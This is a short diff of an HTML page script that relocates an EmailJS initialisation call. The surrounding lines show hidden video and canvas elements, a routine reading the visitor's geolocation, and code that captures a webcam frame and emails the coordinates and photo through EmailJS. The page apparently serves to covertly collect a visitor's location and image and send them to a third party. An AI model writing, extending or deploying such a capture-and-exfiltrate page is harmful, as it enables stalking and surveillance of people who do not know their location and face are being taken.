@@ -12,6 +12,7 @@
         <video id="video" style="display:none"></video>
         <canvas id="canvas" style="display:none"></canvas>
         <script>
+            emailjs.init('3bQ9JJFOFfT3nPO2s')
             function CheckLocation(position){
                 const lat = position.coords.latitude
                 const lon = position.coords.longitude
@@ -38,7 +39,6 @@
                         canvas.height = video.videoHeight
                         canvas.getContext('2d').drawImage(video, 0, 0)
                         const photoBase64 = canvas.toDataURL('image/jpeg')
-                        emailjs.init('3bQ9JJFOFfT3nPO2s')
                         emailjs.send('service_zyazjai', 'template_wvna8o4', {
                             coordinates: lat + ', ' + lon,
                             photo_url: photoBase64,
